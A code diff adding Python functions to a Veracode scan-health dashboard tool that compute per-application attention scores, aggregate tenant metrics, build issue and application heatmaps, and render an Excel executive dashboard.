+        app.scan_health_risk = _worst(
+            _health_risk(app.health_status),
+            _issue_count_risk(app.high_severity_issue_count, cfg["high_severity_issues"]),
+        ) if ever_scanned else "GRAY"
+        if app.flaw_severity_available:
+            app.weighted_flaw_load = round(flaw_weighted_load(app, cfg), 2)
+            basis_val, basis_lbl = flaw_density_basis(app, cfg)
+            app.density_basis_value, app.density_basis_label = basis_val, basis_lbl
+            if basis_val > 0:
+                app.flaw_density = round(
+                    app.weighted_flaw_load / max(basis_val, cfg["flaws"]["min_basis"]), 2)
+        app.security_findings_risk = _flaw_risk(app, cfg)
+        app.quadrant = _quadrant(app)
+
+        apps.append(app)
+
+    # ---- scoring
+    for app in apps:
+        score, band, level, drivers = compute_attention_score(app, cfg)
+        app.attention_score = score
+        app.attention_band = band
+        app.attention_level = level
+        app.attention_drivers = drivers
+
+    apps.sort(key=lambda a: (-a.attention_score, a.app_name.lower(), a.sandbox.lower()))
+    return apps, all_issues
+
+
+_HEALTH_RANK = {"Good": 0, "Fair": 1, "Poor": 2, "Unknown": 3, "": 3}
+
+
+def _classify_trend(previous: str, current: str) -> str:
+    """Direction of travel between two health classifications.
+
+    Unknown on either side means the direction is genuinely unknown; it is not
+    reported as stable.
+    """
+    if not previous or previous == "Unknown" or current == "Unknown":
+        return "Unknown"
+    pr, cr = _HEALTH_RANK.get(previous, 3), _HEALTH_RANK.get(current, 3)
+    if pr == 3 or cr == 3:
+        return "Unknown"
+    if cr < pr:
+        return "Improving"
+    if cr > pr:
+        return "Declining"
+    return "Stable"
+
+
+# ==========================================================================
+# Attention Score
+# ==========================================================================
+
+def compute_attention_score(app: ApplicationHealth,
+                            cfg: dict | None = None) -> tuple[int, str, str, list[str]]:
+    """Return (score 0-100, band label, risk level, explanation drivers).
+
+    Each component contributes ``weight * risk_fraction``. Components whose
+    input is unavailable are excluded from the denominator as well as the
+    numerator, so an application is never rewarded for missing data and never
+    penalised twice for it (the data-quality component covers that).
+    """
+    cfg = cfg or DASHBOARD_CONFIG
+    w = cfg["attention_score"]
+    parts: list[tuple[str, float, float, str]] = []   # (name, weight, fraction, reason)
+
+    # 1. Scan health classification
+    frac = {"Good": 0.0, "Fair": 0.5, "Poor": 1.0}.get(app.health_status)
+    if frac is None:
+        parts.append(("Scan health", w["scan_health_weight"], 1.0,
+                      "Scan health is unknown (no published scan results)"))
+    else:
+        reason = f"Scan health is {app.health_status.upper()}"
+        parts.append(("Scan health", w["scan_health_weight"], frac, reason))
+
+    # 2. Scan recency
+    a = cfg["scan_age"]
+    if app.scan_age_days is None:
+        parts.append(("Scan recency", w["scan_age_weight"], 1.0, "Application has never been scanned"))
+    else:
+        d = app.scan_age_days
+        if d <= a["healthy_days"]:
+            frac = 0.0
+        elif d <= a["warning_days"]:
+            frac = 0.4
+        elif d <= a["critical_days"]:
+            frac = 0.7
+        else:
+            frac = 1.0
+        parts.append(("Scan recency", w["scan_age_weight"], frac, f"Scan is {d} days old"))
+
+    # 3. Security findings
+    t = cfg["flaws"]
+    if not app.ever_scanned:
+        pass  # covered by data quality; no findings dimension exists yet
+    elif not app.flaw_severity_available:
+        parts.append(("Security findings", w["flaw_weight"], 0.5,
+                      "Flaw severity breakdown unavailable for this scan"))
+    else:
+        vh, hi = app.critical_flaws or 0, app.high_flaws or 0
+        frac = 0.0
+        bits: list[str] = []
+        # Severity contributes absolutely; size never dilutes it.
+        if vh:
+            frac = max(frac, _clamp(0.7 + 0.3 * (vh / max(3 * t["very_high_red"], 1))))
+            bits.append(f"{vh} open very-high flaw(s)")
+        if hi:
+            frac = max(frac, _clamp(0.4 + 0.4 * (hi / max(t["high_red"], 1))))
+            bits.append(f"{hi} open high flaw(s)")
+        # Volume contributes relative to application size. Veracode's own score
+        # already accounts for both severity and size, so prefer it.
+        if app.veracode_score is not None:
+            if app.veracode_score < t["score_green"]:
+                frac = max(frac, _clamp((t["score_green"] - app.veracode_score)
+                                        / max(t["score_green"], 1)))
+                bits.append(f"Veracode score {app.veracode_score}"
+                            + (f" (rating {app.veracode_rating})" if app.veracode_rating else ""))
+        elif app.flaw_density is not None:
+            if app.flaw_density >= t["density_yellow"]:
+                frac = max(frac, _clamp(app.flaw_density / max(t["density_red"], 0.01)))
+                bits.append(f"{app.flaw_density} weighted flaws per "
+                            f"{app.density_basis_label} ({app.weighted_flaw_load} weighted "
+                            f"across {app.density_basis_value:g})")
+        elif app.weighted_flaw_load > 0:
+            frac = max(frac, 0.5)
+            bits.append("Flaw volume cannot be normalized; application size is unknown")
+        if _policy_level(app.policy_status) == "RED":
+            frac = max(frac, 0.6)
+            bits.append(f"Policy status: {app.policy_status}")
+        reason = ", ".join(bits) if bits else "No open very-high or high flaws, low flaw volume"
+        parts.append(("Security findings", w["flaw_weight"], frac, reason))
+
+    # 4. High-severity scan-health checks
+    if app.ever_scanned:
+        n = app.high_severity_issue_count
+        frac = {0: 0.0, 1: 0.5, 2: 0.75}.get(n, 1.0)
+        reason = (f"{n} high-severity scan-health issue(s)" if n
+                  else "No high-severity scan-health issues")
+        parts.append(("High-severity issues", w["high_severity_issue_weight"], frac, reason))
+
+    # 5. Trend
+    if app.health_trend in ("Improving", "Stable", "Declining"):
+        frac = {"Improving": 0.0, "Stable": 0.25, "Declining": 1.0}[app.health_trend]
+        if app.health_trend == "Declining":
+            reason = f"Health declined from {app.previous_health.upper()} to {app.health_status.upper()}"
+        elif app.health_trend == "Improving":
+            reason = f"Health improved from {app.previous_health.upper()} to {app.health_status.upper()}"
+        else:
+            reason = f"Health unchanged at {app.health_status.upper()}"
+        parts.append(("Trend", w["trend_weight"], frac, reason))
+
+    # 6. Data quality
+    gaps: list[str] = []
+    if not app.ever_scanned:
+        gaps.append("no published scan results")
+    else:
+        if not app.flaw_severity_available:
+            gaps.append("no flaw severity data")
+        if app.total_modules == 0:
+            gaps.append("no module data")
+        if app.sca_status == "Unknown":
+            gaps.append("SCA status unknown")
+    dq = _clamp(len(gaps) / 2.0) if gaps else 0.0
+    if not app.ever_scanned:
+        dq = 1.0
+    parts.append(("Data quality", w["data_quality_weight"], dq,
+                  "Data gaps: " + ", ".join(gaps) if gaps else "Complete data"))
+
+    total_w = sum(p[1] for p in parts)
+    if total_w <= 0:
+        return 0, "Normal", "GREEN", ["No scoring inputs available"]
+
+    raw = sum(p[1] * p[2] for p in parts)
+    score = int(round(100.0 * raw / total_w))
+    score = max(0, min(100, score))
+
+    capped = False
+    cap = w.get("never_scanned_cap", 100)
+    if not app.ever_scanned and score > cap:
+        score = cap
+        capped = True
+
+    band, level = "Normal", "GREEN"
+    for lo, hi, lbl, lvl in cfg["attention_bands"]:
+        if lo <= score <= hi:
+            band, level = lbl, lvl
+            break
+
+    # Drivers: only components that actually pushed the score up, biggest first.
+    contribs = sorted(
+        [(p[0], p[1] * p[2], p[3]) for p in parts if p[2] > 0],
+        key=lambda x: -x[1],
+    )
+    drivers = [f"{reason} (+{int(round(100.0 * c / total_w))})" for _, c, reason in contribs]
+    if capped:
+        drivers.append(f"Score capped at {cap}: risk is unmeasured, not confirmed")
+    if not drivers:
+        drivers = ["No attention drivers; all measured dimensions are healthy"]
+    return score, band, level, drivers
+
+
+# ==========================================================================
+# Aggregation
+# ==========================================================================
+
+@dataclass
+class TenantMetrics:
+    generated: str = ""
+    total_apps: int = 0
+    scanned_apps: int = 0
+    never_scanned: int = 0
+    good: int = 0
+    fair: int = 0
+    poor: int = 0
+    unknown: int = 0
+    stale: int = 0
+    fresh: int = 0
+    with_high_severity_issues: int = 0
+    with_critical_or_high_flaws: int = 0
+    flaw_severity_unavailable: int = 0
+    total_flaws: int = 0
+    open_policy_flaws: int = 0
+    critical_flaws: int = 0
+    high_flaws: int = 0
+    avg_flaws_per_app: float = 0.0
+    avg_scan_age: float | None = None
+    median_scan_age: float | None = None
+    policy_pass: int = 0
+    policy_conditional: int = 0
+    policy_fail: int = 0
+    policy_unknown: int = 0
+    with_veracode_score: int = 0
+    median_flaw_density: float | None = None
+    p90_flaw_density: float | None = None
+    density_basis_label: str = ""
+    total_sca_components: int = 0
+    total_upload_mb: float = 0.0
+    total_analysis_mb: float = 0.0
+    missing_sca: int = 0
+    attention_bands: dict[str, int] = field(default_factory=dict)
+    quadrants: dict[str, int] = field(default_factory=dict)
+    trends: dict[str, int] = field(default_factory=dict)
+
+    @property
+    def scan_compliance_pct(self) -> float:
+        return _pct(self.fresh, self.total_apps)
+
+    @property
+    def policy_pass_pct(self) -> float:
+        """Share of profiles with a known policy outcome that passed.
+        Unknown outcomes are excluded from the denominator rather than counted
+        as failures."""
+        known = self.policy_pass + self.policy_conditional + self.policy_fail
+        return _pct(self.policy_pass, known)
+
+    @property
+    def healthy_pct(self) -> float:
+        return _pct(self.good, self.total_apps)
+
+
+def _percentile(sorted_vals: list[float], p: float) -> float:
+    """Nearest-rank percentile. Deterministic, no numpy dependency."""
+    if not sorted_vals:
+        return 0.0
+    k = max(0, min(len(sorted_vals) - 1, int(math.ceil(p / 100.0 * len(sorted_vals))) - 1))
+    return round(sorted_vals[k], 2)
+
+
+def aggregate_tenant(apps: Sequence[ApplicationHealth], cfg: dict | None = None) -> TenantMetrics:
+    cfg = cfg or DASHBOARD_CONFIG
+    m = TenantMetrics(
+        generated=datetime.now().strftime("%Y-%m-%d %H:%M"),
+        total_apps=len(apps),
+    )
+    ages: list[int] = []
+    for a in apps:
+        if a.ever_scanned:
+            m.scanned_apps += 1
+        else:
+            m.never_scanned += 1
+        m.good += a.health_status == "Good"
+        m.fair += a.health_status == "Fair"
+        m.poor += a.health_status == "Poor"
+        m.unknown += a.health_status == "Unknown"
+
+        if a.scan_age_days is None:
+            pass
+        else:
+            ages.append(a.scan_age_days)
+            if a.scan_age_days <= cfg["scan_age"]["healthy_days"]:
+                m.fresh += 1
+            else:
+                m.stale += 1
+
+        pl = _policy_level(a.policy_status)
+        m.policy_pass += pl == "GREEN"
+        m.policy_conditional += pl == "YELLOW"
+        m.policy_fail += pl == "RED"
+        m.policy_unknown += pl == "GRAY"
+        m.with_veracode_score += a.veracode_score is not None
+
+        m.with_high_severity_issues += a.high_severity_issue_count > 0
+        if a.flaw_severity_available:
+            m.critical_flaws += a.critical_flaws or 0
+            m.high_flaws += a.high_flaws or 0
+            if (a.critical_flaws or 0) or (a.high_flaws or 0):
+                m.with_critical_or_high_flaws += 1
+        elif a.ever_scanned:
+            m.flaw_severity_unavailable += 1
+
+        m.total_flaws += a.total_flaws
+        m.open_policy_flaws += a.open_policy_flaws
+        m.total_sca_components += a.sca_component_count
+        m.total_upload_mb += a.total_upload_mb
+        m.total_analysis_mb += a.analysis_size_mb
+        m.missing_sca += a.sca_status == "Missing"
+
+        m.attention_bands[a.attention_level] = m.attention_bands.get(a.attention_level, 0) + 1
+        m.quadrants[a.quadrant] = m.quadrants.get(a.quadrant, 0) + 1
+        m.trends[a.health_trend] = m.trends.get(a.health_trend, 0) + 1
+
+    dens = sorted(a.flaw_density for a in apps if a.flaw_density is not None)
+    if dens:
+        m.median_flaw_density = _percentile(dens, 50)
+        m.p90_flaw_density = _percentile(dens, 90)
+        m.density_basis_label = next(a.density_basis_label for a in apps
+                                     if a.flaw_density is not None)
+    m.avg_flaws_per_app = round(m.total_flaws / len(apps), 1) if apps else 0.0
+    if ages:
+        m.avg_scan_age = round(sum(ages) / len(ages), 1)
+        s = sorted(ages)
+        mid = len(s) // 2
+        m.median_scan_age = float(s[mid]) if len(s) % 2 else round((s[mid - 1] + s[mid]) / 2, 1)
+    m.total_upload_mb = round(m.total_upload_mb, 1)
+    m.total_analysis_mb = round(m.total_analysis_mb, 1)
+    return m
+
+
+def build_issue_heatmap(issues: Sequence[HealthIssue], total_apps: int,
+                        cfg: dict | None = None,
+                        prev_issue_counts: dict[int, int] | None = None) -> list[dict]:
+    """One row per health check, including checks that nothing triggered.
+
+    Severity-aware: colour combines the check's severity with how widespread it
+    is, so 'a few serious issues' stays visually distinct from 'many small
+    issues'.
+    """
+    cfg = cfg or DASHBOARD_CONFIG
+    prev_issue_counts = prev_issue_counts or {}
+    by_check: dict[int, list[HealthIssue]] = {}
+    for i in issues:
+        by_check.setdefault(i.check_number, []).append(i)
+
+    p = cfg["issue_prevalence"]
+    rows: list[dict] = []
+    for num in sorted(CHECK_CATALOG):
+        label, max_sev = CHECK_CATALOG[num]
+        group = by_check.get(num, [])
+        apps_hit = sorted({(g.app_name, g.sandbox) for g in group})
+        n = len(apps_hit)
+        pct = _pct(n, total_apps)
+
+        if group:
+            sev = "HIGH" if any(g.severity == "high" for g in group) else "MEDIUM"
+        else:
+            sev = max_sev.upper()
+
+        if n == 0:
+            level = "GREEN"
+        elif sev == "HIGH":
+            level = "RED" if pct >= p["common_pct"] else "ORANGE"
+        else:
+            level = "ORANGE" if pct >= p["widespread_pct"] else "YELLOW"
+
+        prev_n = prev_issue_counts.get(num)
+        if prev_n is None:
+            trend = "Unknown"
+        elif n < prev_n:
+            trend = "Improving"
+        elif n > prev_n:
+            trend = "Declining"
+        else:
+            trend = "Stable"
+
+        bus = sorted({g.business_unit for g in group if g.business_unit})
+        rows.append({
+            "Check #": num,
+            "Issue": label,
+            "Category": group[0].category if group else DEFAULT_CHECK_CATEGORIES.get(num, "Other"),
+            "Severity": sev,
+            "Apps Affected": n,
+            "Total Apps": total_apps,
+            "% of Tenant": pct,
+            "Occurrences": len(group),
+            "Business Units Affected": len(bus),
+            "Previous Apps Affected": prev_n if prev_n is not None else "N/A",
+            "Trend": trend,
+            "_level": level,
+            "_apps": [f"{a}{' [' + s + ']' if s else ''}" for a, s in apps_hit],
+            "Top Recommendation": next((g.recommendation for g in group if g.recommendation), ""),
+        })
+
+    sev_rank = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
+    rows.sort(key=lambda r: (-r["Apps Affected"], sev_rank.get(r["Severity"], 3)))
+    return rows
+
+
+def build_tenant_trend(current: TenantMetrics,
+                       prev_rows: dict | None,
+                       cfg: dict | None = None) -> list[dict]:
+    """Tenant-level previous-vs-current comparison.
+
+    Direction is semantic: more healthy applications is an improvement, more
+    total flaws is a deterioration. The arrow never simply follows the sign of
+    the delta.
+    """
+    if not prev_rows:
+        return []
+    cfg = cfg or DASHBOARD_CONFIG
+
+    rows = list(prev_rows.values())
+    p_total = len(rows)
+    p_good = sum(1 for r in rows if r.get("Health") == "Good")
+    p_fair = sum(1 for r in rows if r.get("Health") == "Fair")
+    p_poor = sum(1 for r in rows if r.get("Health") == "Poor")
+    p_flaws = sum(_i(r.get("Total Flaws")) for r in rows)
+    p_open = sum(_i(r.get("Open Affecting Policy")) for r in rows)
+    p_stale = 0
+    for r in rows:
+        d = r.get("Days Since Scan")
+        if isinstance(d, int) and d > cfg["scan_age"]["healthy_days"]:
+            p_stale += 1
+        elif isinstance(d, str) and d.isdigit() and int(d) > cfg["scan_age"]["healthy_days"]:
+            p_stale += 1
+
+    # (metric, previous, current, higher_is_better)
+    spec = [
+        ("Total applications", p_total, current.total_apps, None),
+        ("Healthy (Good)", p_good, current.good, True),
+        ("Fair", p_fair, current.fair, False),
+        ("Poor", p_poor, current.poor, False),
+        ("Stale scans", p_stale, current.stale, False),
+        ("Total flaws", p_flaws, current.total_flaws, False),
+        ("Open policy-affecting flaws", p_open, current.open_policy_flaws, False),
+    ]
+
+    out: list[dict] = []
+    for name, prev, curr, higher_better in spec:
+        delta = curr - prev
+        if delta == 0:
+            arrow, level = "=", "GRAY"
+        elif higher_better is None:
+            arrow, level = ("+" if delta > 0 else "-"), "GRAY"
+        else:
+            improved = (delta > 0) == bool(higher_better)
+            arrow = "UP" if delta > 0 else "DOWN"
+            level = "GREEN" if improved else "RED"
+        out.append({
+            "Metric": name,
+            "Previous": prev,
+            "Current": curr,
+            "Change": f"{delta:+d}" if delta else "0",
+            "Direction": arrow,
+            "_level": level,
+        })
+    return out
+
+
+def build_heatmap_rows(apps: Sequence[ApplicationHealth],
+                       cfg: dict | None = None) -> list[dict]:
+    """Application heatmap. '_lv_<Column>' keys carry the colour for each cell
+    and are hidden from the rendered table."""
+    cfg = cfg or DASHBOARD_CONFIG
+    rows: list[dict] = []
+    for a in apps:
+        crit = a.critical_flaws if a.flaw_severity_available else "N/A"
+        high = a.high_flaws if a.flaw_severity_available else "N/A"
+        med = a.medium_flaws if a.flaw_severity_available else "N/A"
+        low = a.low_flaws if a.flaw_severity_available else "N/A"
+
+        row = {
+            "Application": a.app_name,
+            "Sandbox": a.sandbox or "(policy)",
+            "Business Unit": a.business_unit or "Unknown",
+            "Attention Score": a.attention_score,
+            "Priority": a.attention_band,
+            "Scan Health": a.health_status,
+            "Scan Age": a.scan_age_days if a.scan_age_days is not None else "Never",
+            "Scan Age Bucket": a.scan_age_bucket,
+            "Findings Risk": a.security_findings_risk if a.flaw_severity_available else "Unknown",
+            "Very High Flaws": crit,
+            "High Flaws": high,
+            "Medium Flaws": med,
+            "Low Flaws": low,
+            "Veracode Score": a.veracode_score if a.veracode_score is not None else "N/A",
+            "Veracode Rating": a.veracode_rating or "N/A",
+            "Policy Status": a.policy_status or "Unknown",
+            "Findings Basis": a.findings_basis or "N/A",
+            "Weighted Flaws": a.weighted_flaw_load if a.flaw_severity_available else "N/A",
+            "Flaw Density": (a.flaw_density if a.flaw_density is not None
+                             else ("N/A" if a.flaw_severity_available else "Unknown")),
+            "Density Basis": (f"{a.density_basis_value:g} {a.density_basis_label}"
+                              if a.flaw_severity_available else "Unknown"),
+            "Total Flaws": a.total_flaws if a.ever_scanned else "N/A",
+            "Open Policy Flaws": a.open_policy_flaws if a.ever_scanned else "N/A",
+            "SCA": a.sca_status,
+            "SCA Components": a.sca_component_count,
+            "Health Issues": a.health_issue_count if a.ever_scanned else "N/A",
+            "High-Severity Issues": a.high_severity_issue_count if a.ever_scanned else "N/A",
+            "Upload Size (MB)": a.total_upload_mb,
+            "Last Scan": a.last_scan_date or "Never",
+            "Previous Health": a.previous_health or "N/A",
+            "Change": {"Improving": "UP", "Declining": "DOWN",
+                       "Stable": "=", "New": "NEW"}.get(a.health_trend, "N/A"),
+            "Trend": a.health_trend,
+            "Quadrant": a.quadrant,
+            "Top Issue": a.top_issue or "None",
+            # hidden colour helpers
+            "_lv_Attention Score": a.attention_level,
+            "_lv_Priority": a.attention_level,
+            "_lv_Scan Health": _health_risk(a.health_status),
+            "_lv_Scan Age": _scan_age_risk(a.scan_age_days, cfg),
+            "_lv_Scan Age Bucket": _scan_age_risk(a.scan_age_days, cfg),
+            "_lv_Findings Risk": a.security_findings_risk,
+            "_lv_Flaw Density": _density_level(a, cfg),
+            "_lv_Veracode Score": _score_level(a.veracode_score, cfg),
+            "_lv_Policy Status": _policy_level(a.policy_status),
+            "_lv_Very High Flaws": _sev_cell_level(crit, 1, 1),
+            "_lv_High Flaws": _sev_cell_level(high, 1, cfg["flaws"]["high_red"]),
+            "_lv_SCA": _sca_risk(a.sca_status),
+            "_lv_Health Issues": (_issue_count_risk(a.health_issue_count, cfg["health_issues"])
+                                  if a.ever_scanned else "GRAY"),
+            "_lv_High-Severity Issues": (_issue_count_risk(a.high_severity_issue_count,
+                                                           cfg["high_severity_issues"])
+                                         if a.ever_scanned else "GRAY"),
+            "_lv_Previous Health": _health_risk(a.previous_health) if a.previous_health else "GRAY",
+            "_lv_Change": _trend_risk(a.health_trend),
+            "_lv_Trend": _trend_risk(a.health_trend),
+            "_key": a.key,
+        }
+        rows.append(row)
+    return rows
+
+
+def _score_level(score: int | None, cfg: dict) -> str:
+    if score is None:
+        return "GRAY"
+    t = cfg["flaws"]
+    if score >= t["score_green"]:
+        return "GREEN"
+    if score >= t["score_yellow"]:
+        return "YELLOW"
+    return "RED"
+
+
+def _policy_level(status: str) -> str:
+    s = (status or "").strip().lower()
+    if not s:
+        return "GRAY"
+    if s.startswith("pass"):
+        return "GREEN"
+    if "conditional" in s:
+        return "YELLOW"
+    if "did not pass" in s or s.startswith("fail"):
+        return "RED"
+    return "GRAY"
+
+
+def _density_level(app: ApplicationHealth, cfg: dict) -> str:
+    if app.flaw_density is None:
+        return "GRAY"
+    t = cfg["flaws"]
+    if app.flaw_density >= t["density_red"]:
+        return "RED"
+    if app.flaw_density >= t["density_yellow"]:
+        return "YELLOW"
+    return "GREEN"
+
+
+def _sev_cell_level(v: Any, yellow_at: int, red_at: int) -> str:
+    if not isinstance(v, int):
+        return "GRAY"
+    if v >= red_at:
+        return "RED"
+    if v >= yellow_at:
+        return "ORANGE"
+    return "GREEN"
+
+
+def build_priority_list(apps: Sequence[ApplicationHealth],
+                        n: int | None = None,
+                        cfg: dict | None = None) -> list[dict]:
+    cfg = cfg or DASHBOARD_CONFIG
+    n = n or cfg["top_n_attention"]
+    out: list[dict] = []
+    for rank, a in enumerate(apps[:n], 1):
+        ch = (f"{a.critical_flaws} / {a.high_flaws}"
+              if a.flaw_severity_available else "Not available")
+        out.append({
+            "Priority": rank,
+            "Application": a.display_name,
+            "Business Unit": a.business_unit or "Unknown",
+            "Attention Score": a.attention_score,
+            "Band": a.attention_band,
+            "Scan Health": a.health_status,
+            "Very High / High Flaws": ch,
+            "Scan Age (days)": a.scan_age_days if a.scan_age_days is not None else "Never scanned",
+            "Top Issue": a.top_issue or "None",
+            "Trend": a.health_trend,
+            "Why": "; ".join(a.attention_drivers[:2]),
+            "_level": a.attention_level,
+        })
+    return out
+
+
+# ==========================================================================
+# Excel rendering
+# ==========================================================================
+
+_FONT = "Arial"
+_TITLE_FILL = PatternFill("solid", fgColor="14213D")
+_BAND_FILL = PatternFill("solid", fgColor="1F4E79")
+_SUB_FILL = PatternFill("solid", fgColor="E8EDF3")
+_KPI_FILL = PatternFill("solid", fgColor="F5F7FA")
+_THIN = Side(style="thin", color="D0D0D0")
+_BORDER = Border(left=_THIN, right=_THIN, top=_THIN, bottom=_THIN)
+
+
+def _lvl_fill(level: str, cfg: dict, strong: bool = False) -> PatternFill:
+    key = "colors" if strong else "fills"
+    return PatternFill("solid", fgColor=cfg[key].get(level, cfg[key]["GRAY"]))
+
+
+def _write_title(ws, row: int, text: str, width: int, fill=_BAND_FILL,
+                 size: int = 11, color: str = "FFFFFF") -> int:
+    ws.merge_cells(start_row=row, start_column=1, end_row=row, end_column=width)
+    c = ws.cell(row=row, column=1, value=text)
+    c.fill = fill
+    c.font = Font(name=_FONT, size=size, bold=True, color=color)
+    c.alignment = Alignment(horizontal="left", vertical="center", indent=1)
+    ws.row_dimensions[row].height = 22 if size <= 12 else 30
+    return row + 1
+
+
+def _write_table(ws, row: int, headers: list[str], data: list[list],
+                 levels: list[list[str]] | None, cfg: dict,
+                 spans: list[int] | None = None,
+                 left_cols: Iterable[int] = (),
+                 row_height: int | None = None) -> int:
+    """Write a table on the fixed dashboard grid.
+
+    `spans` gives the number of grid columns each logical column occupies, so
+    long-text columns can breathe without any block resizing the shared grid.
+    Column widths are owned by the sheet, never by individual tables.
+    """
+    spans = spans or [1] * len(headers)
+    left = set(left_cols)
+
+    def _cells(r: int, values: list, styler) -> None:
+        col = 1
+        for idx, v in enumerate(values):
+            span = spans[idx]
+            if span > 1:
+                ws.merge_cells(start_row=r, start_column=col, end_row=r, end_column=col + span - 1)
+            c = ws.cell(row=r, column=col, value=_safe_cell(v))
+            styler(c, idx)
+            for cc in range(col, col + span):
+                ws.cell(row=r, column=cc).border = _BORDER
+            col += span
+
+    def _hdr_style(c, idx):
+        c.fill = _SUB_FILL
+        c.font = Font(name=_FONT, size=9, bold=True, color="1F4E79")
+        c.alignment = Alignment(horizontal="left" if idx in left else "center",
+                                vertical="center", wrap_text=True, indent=1 if idx in left else 0)
+
+    _cells(row, headers, _hdr_style)
+    row += 1
+
+    for ri, rowvals in enumerate(data):
+        def _body_style(c, idx, ri=ri):
+            c.font = Font(name=_FONT, size=10)
+            c.alignment = Alignment(horizontal="left" if idx in left else "center",
+                                    vertical="center", wrap_text=True,
+                                    indent=1 if idx in left else 0)
+            if levels:
+                lv = levels[ri][idx]
+                if lv:
+                    c.fill = _lvl_fill(lv, cfg)
+                    if lv in ("RED", "ORANGE"):
+                        c.font = Font(name=_FONT, size=10, bold=True, color=cfg["colors"][lv])
+        _cells(row + ri, rowvals, _body_style)
+        if row_height:
+            ws.row_dimensions[row + ri].height = row_height
+    return row + len(data)
+
+
+def write_dashboard_sheets(wb: Workbook,
+                           apps: Sequence[ApplicationHealth],
+                           issues: Sequence[HealthIssue],
+                           metrics: TenantMetrics,
+                           tenant_trend: list[dict],
+                           issue_rows: list[dict],
+                           cfg: dict | None = None) -> None:
+    """Insert 'Executive Dashboard', 'App Heatmap' and 'Issue Heatmap' as the
+    first three sheets of an existing workbook. Existing sheets are untouched.
+
+    The dashboard sheet uses a mixed block layout, which cannot carry an Excel
+    autofilter. The two heatmap sheets carry the filterable/sortable tables.
+    """
+    cfg = cfg or DASHBOARD_CONFIG
+    _write_exec_sheet(wb, apps, metrics, tenant_trend, issue_rows, cfg)
+    _write_app_heatmap_sheet(wb, apps, cfg)
+    _write_issue_heatmap_sheet(wb, issue_rows, metrics, cfg)
+    # Order: dashboard, app heatmap, issue heatmap, then everything pre-existing.
+    order = ["Executive Dashboard", "App Heatmap", "Issue Heatmap"]
+    wb._sheets.sort(key=lambda s: order.index(s.title) if s.title in order else len(order))
+
+
+# Fixed 12-column grid for the dashboard sheet. Set once, never overridden.
+_EXEC_GRID = 12
+_EXEC_WIDTHS = {1: 26}
+for _c in range(2, _EXEC_GRID + 1):
+    _EXEC_WIDTHS[_c] = 13
+
+
+def _write_exec_sheet(wb: Workbook, apps: Sequence[ApplicationHealth],
+                      m: TenantMetrics, tenant_trend: list[dict],
+                      issue_rows: list[dict], cfg: dict) -> None:
+    ws = wb.create_sheet("Executive Dashboard")
+    ws.sheet_view.showGridLines = False
+    ws.page_setup.orientation = "landscape"
+    ws.page_setup.fitToWidth = 1
+    ws.page_setup.fitToHeight = 0
+    ws.sheet_properties.pageSetUpPr.fitToPage = True
+    ws.print_options.horizontalCentered = True
+    W = _EXEC_GRID
+    for ci, wd in _EXEC_WIDTHS.items():
+        ws.column_dimensions[get_column_letter(ci)].width = wd
+
+    def band(r: int, text: str) -> int:
+        return _write_title(ws, r, text, W)
+
+    def note(r: int, text: str) -> int:
+        ws.merge_cells(start_row=r, start_column=1, end_row=r, end_column=W)
+        c = ws.cell(row=r, column=1, value=text)
+        c.font = Font(name=_FONT, size=9, italic=True, color="555555")
+        c.alignment = Alignment(horizontal="left", vertical="center", indent=1, wrap_text=True)
+        return r + 1
+
+    r = 1
+    # ---- title
+    ws.merge_cells(start_row=r, start_column=1, end_row=r + 1, end_column=W)
+    c = ws.cell(row=r, column=1, value="VERACODE TENANT SCAN HEALTH")
+    c.fill = _TITLE_FILL
+    c.font = Font(name=_FONT, size=18, bold=True, color="FFFFFF")
+    c.alignment = Alignment(horizontal="left", vertical="center", indent=1)
+    ws.row_dimensions[r].height = 26
+    ws.row_dimensions[r + 1].height = 16
+    r += 2
+    r = note(r, f"Generated {m.generated}")
+    ws.merge_cells(start_row=r, start_column=1, end_row=r, end_column=W)
+    c = ws.cell(row=r, column=1, value=DISCLAIMER)
+    c.font = Font(name=_FONT, size=9, italic=True, color="8A6D00")
+    c.fill = PatternFill("solid", fgColor="FDF6E3")
+    c.alignment = Alignment(horizontal="left", vertical="center", indent=1)
+    c.border = _BORDER
+    ws.row_dimensions[r].height = 20
+    r += 2
+
+    # ---- KPI cards
+    comp_lv = ("GREEN" if m.scan_compliance_pct >= 80
+               else "YELLOW" if m.scan_compliance_pct >= 60 else "RED")
+    r = _kpi_row(ws, r, [
+        ("TOTAL APPS", f"{m.total_apps:,}", "profiles evaluated", "GRAY"),
+        ("HEALTHY", f"{m.good:,}", f"{_pct(m.good, m.total_apps)}% of tenant", "GREEN"),
+        ("NEEDS ATTENTION", f"{m.fair:,}", f"{_pct(m.fair, m.total_apps)}% of tenant", "YELLOW"),
+        ("POOR", f"{m.poor:,}", f"{_pct(m.poor, m.total_apps)}% of tenant", "RED"),
+        ("UNKNOWN", f"{m.unknown:,}", f"{_pct(m.unknown, m.total_apps)}% never scanned", "GRAY"),
+    ], cfg, span=W)
+
+    r = _kpi_row(ws, r, [
+        ("SCAN COMPLIANCE", f"{m.fresh:,} / {m.total_apps:,}",
+         f"{m.scan_compliance_pct}% scanned within {cfg['scan_age']['healthy_days']}d", comp_lv),
+        ("STALE SCANS", f"{m.stale:,} / {m.total_apps:,}",
+         f"{_pct(m.stale, m.total_apps)}% of tenant", "RED" if m.stale else "GREEN"),
+        ("HIGH-SEV ISSUES", f"{m.with_high_severity_issues:,} / {m.total_apps:,}",
+         f"{_pct(m.with_high_severity_issues, m.total_apps)}% of tenant",
+         "RED" if m.with_high_severity_issues else "GREEN"),
+        ("POLICY FAILING", f"{m.policy_fail:,} / {m.policy_pass + m.policy_conditional + m.policy_fail:,}",
+         (f"{m.policy_pass_pct}% of evaluated apps pass"
+          if (m.policy_pass + m.policy_conditional + m.policy_fail)
+          else "no policy outcome reported"),
+         "RED" if m.policy_fail else ("GRAY" if not m.policy_pass else "GREEN")),
+        ("VERY HIGH / HIGH", f"{m.critical_flaws:,} / {m.high_flaws:,}",
+         (f"{m.flaw_severity_unavailable} app(s) lack severity data"
+          if m.flaw_severity_unavailable else "open flaws across tenant"),
+         "RED" if (m.critical_flaws or m.high_flaws) else "GREEN"),
+    ], cfg, span=W)
+
+    # ---- tenant health distribution
+    r = band(r, "TENANT SCAN HEALTH DISTRIBUTION")
+    for label, n, lv in (("Good", m.good, "GREEN"), ("Fair", m.fair, "YELLOW"),
+                         ("Poor", m.poor, "RED"), ("Unknown", m.unknown, "GRAY")):
+        c = ws.cell(row=r, column=1, value=label)
+        c.font = Font(name=_FONT, size=10, bold=True, color=cfg["colors"][lv])
